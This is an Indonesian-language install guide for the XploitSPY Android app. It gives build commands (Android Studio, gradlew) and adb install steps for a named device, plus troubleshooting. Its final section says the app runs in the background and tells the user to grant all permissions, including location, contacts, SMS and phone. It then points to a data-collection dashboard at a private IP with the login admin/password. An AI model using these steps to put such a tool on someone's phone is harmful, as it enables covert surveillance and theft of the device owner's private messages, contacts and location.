# Quick Install APK ke Device

## ✅ Status Saat Ini

- ✅ Device terdeteksi: `R9CX100A5NF`
- ✅ Device sudah authorized
- ❌ APK belum di-build

## 🚀 Cara Install (Paling Mudah)

Jalankan script otomatis:

```bash
./FIX_DEVICE_AND_INSTALL.sh
```

Script ini akan:
1. ✅ Check device status
2. ✅ Build APK (jika belum ada)
3. ✅ Install APK ke device

## 📋 Manual Steps

### Step 1: Build APK

#### Opsi A: Menggunakan Android Studio (Recommended)

1. Buka Android Studio
2. File → Open → Pilih folder `client/`
3. Tunggu Gradle sync
4. Build → Build Bundle(s) / APK(s) → Build APK(s)
5. APK akan tersedia di: `client/app/build/outputs/apk/release/app-release.apk`

#### Opsi B: Menggunakan Command Line

```bash
cd client
./gradlew assembleRelease
```

**Note:** Pastikan Android SDK sudah terinstall!

### Step 2: Install APK

Setelah APK di-build, install dengan:

```bash
# Dari root directory
adb install -r client/app/build/outputs/apk/release/app-release.apk
```

Atau:

```bash
cd client/app/build/outputs/apk/release
adb install -r app-release.apk
```

## 🔧 Troubleshooting

### Device "unauthorized"

1. Check screen Android device
2. Cari dialog "Allow USB debugging?"
3. Check "Always allow from this computer"
4. Tap "Allow"
5. Run `adb devices` lagi

### APK tidak ditemukan

```bash
# Cek apakah APK sudah di-build
ls -la client/app/build/outputs/apk/release/

# Jika tidak ada, build dulu
cd client && ./gradlew assembleRelease
```

### Install failed

```bash
# Uninstall versi lama dulu
adb uninstall com.xploitspy.client

# Install lagi
adb install -r client/app/build/outputs/apk/release/app-release.apk
```

### Build Error: Android SDK not found

Install Android Studio:
- Download: https://developer.android.com/studio
- Install dan setup Android SDK

Atau set ANDROID_HOME:
```bash
export ANDROID_HOME=$HOME/Library/Android/sdk  # Mac
export PATH=$PATH:$ANDROID_HOME/tools
export PATH=$PATH:$ANDROID_HOME/platform-tools
```

## ✅ Setelah Install

1. **Open App di Device**
   - Buka aplikasi XploitSPY
   - App akan berjalan di background

2. **Grant Permissions**
   - Berikan semua permissions yang diminta
   - Location, Contacts, SMS, Phone, Storage, dll

3. **Check Dashboard**
   - Buka: http://10.254.103.119:3000
   - Login: admin / password
   - Device harus muncul di daftar
   - Data akan mulai muncul

## 📱 Device Info

- Device ID: `R9CX100A5NF`
- Status: ✅ Authorized
- Ready for install: ✅ Yes

